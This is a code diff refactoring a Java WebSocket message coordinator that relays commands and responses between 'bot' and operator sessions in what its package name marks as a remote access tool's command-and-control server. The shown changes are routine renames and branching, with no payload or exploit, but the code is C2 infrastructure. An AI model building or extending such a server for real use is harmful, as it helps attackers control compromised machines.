@@ -1,9 +1,9 @@
 package devs.alex.sah.rat.c2server.services.impl;
 
+import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
 import devs.alex.sah.rat.c2server.models.AssociativePair;
 import devs.alex.sah.rat.c2server.utils.Utils;
 import lombok.extern.slf4j.Slf4j;
-import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
 import devs.alex.sah.rat.c2server.models.Message;
 import devs.alex.sah.rat.c2server.services.MessagesCoordinator;
 import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
@@ -24,14 +24,15 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
 
     private final WebSocketSessionService botWSSessionService;
     private final WebSocketSessionService userWSSessionService;
-    private final MessagesConfiguration config;
+    private final MessagesConfiguration mConfig;
     public MessagesCoordinatorImpl(@Qualifier("botWebSocketSessionService") WebSocketSessionService botWSSessionService,
                                    @Qualifier("userWebSocketSessionService") WebSocketSessionService userWSSessionService,
-                                   MessagesConfiguration constants) {
+                                   MessagesConfiguration messagesConfiguration) {
         this.botWSSessionService = botWSSessionService;
         this.userWSSessionService = userWSSessionService;
-        this.config = constants;
+        this.mConfig = messagesConfiguration;
     }
+
 
     @Override
     public void handleBotTextMessage(WebSocketSession session, TextMessage message) {
@@ -45,25 +46,34 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
 
     @Override
     public void handleUserTextMessage(WebSocketSession session, TextMessage message) {
-        Message<String> parsedMessage = Utils.parseMessage(message);
+        Message<String> parsedMessage = Utils.parseMessage(message);  // TODO validation
+        String recipientType = parsedMessage.params().get(mConfig.keys.recipientType);
 
-        if(parsedMessage.params().get(config.RECIPIENT_TYPE).equals("S")) {
+        if(recipientType.equals("S")) {
             // TODO
         } else{
-            String packageType = parsedMessage.params().get(config.PACKAGE_TYPE);
-            String recipientID = parsedMessage.params().get("ID");
-            String senderRequestId = parsedMessage.params().get("REQ");
 
-            WebSocketSession recipientSession = parsedMessage.params().get(config.RECIPIENT_TYPE).equals("B") ?
-                    botWSSessionService.getSession(recipientID) : userWSSessionService.getSession(recipientID);
+            String packageType = parsedMessage.params().get(mConfig.keys.packageType);
+            String recipientID = parsedMessage.params().get(mConfig.keys.recipientID);
+            String senderRequestId = parsedMessage.params().get(mConfig.keys.requestID);
 
-            if(packageType.equals("con")){
+            WebSocketSession recipientSession;
+            if(recipientType.equals("B")){
+                recipientSession = botWSSessionService.getSession(recipientID);
+            } else if(recipientType.equals("H")){
+                recipientSession =  userWSSessionService.getSession(recipientID);
+            } else {
+                log.error("ERROR"); // TODO Send error to user
+                return;
+            }
+
+            if(packageType.equals("con")){ // CE - continuation envelope
                 String envelope = (String)recipientSession.getAttributes().get("CE-"+ senderRequestId);
                 sendTextMessage(recipientSession, envelope, parsedMessage.getPayload());
                 return;
             }
 
-            if(packageType.equals("last")){
+            if(packageType.equals("last")){ // LE - last envelope
                 String envelope = (String)recipientSession.getAttributes().get("LE-"+ senderRequestId);
                 sendTextMessage(recipientSession, envelope, parsedMessage.getPayload());
 
@@ -72,19 +82,21 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
                 return;
             }
 
-            String requiredResponse = parsedMessage.params().get(config.RESPONSE_TYPE);
-            String module = parsedMessage.params().get(config.MODULE);
-            String recipientType = parsedMessage.params().get(config.RECIPIENT_TYPE);
-
+            String requiredResponse = parsedMessage.params().get(mConfig.keys.responseType);
+            String module = parsedMessage.params().get(mConfig.keys.module);
 
             String association = recipientType.equals("H") ?
                     (String)session.getAttributes().get("userId") : UUID.randomUUID().toString();
 
             if(packageType.equals("first")){
-                recipientSession.getAttributes()
-                        .put("CE-" + senderRequestId, Utils.generateBotEnvelope("con", module, association));
-                recipientSession.getAttributes()
-                        .put("LE-" + senderRequestId, Utils.generateBotEnvelope("last", module, association));
+                if(recipientType.equals("B")){
+                    recipientSession.getAttributes()
+                            .put("CE-" + senderRequestId, Utils.generateBotEnvelope("con", module, association));
+                    recipientSession.getAttributes()
+                            .put("LE-" + senderRequestId, Utils.generateBotEnvelope("last", module, association));
+                } else {
+                    log.error("Error"); // TODO
+                }
             }
 
             if(recipientType.equals("H")){
@@ -118,12 +130,8 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
 
     }
 
-
     @Override
     public void handlePongMessage(WebSocketSession session, PongMessage message) {
 
     }
-
-
-
 }
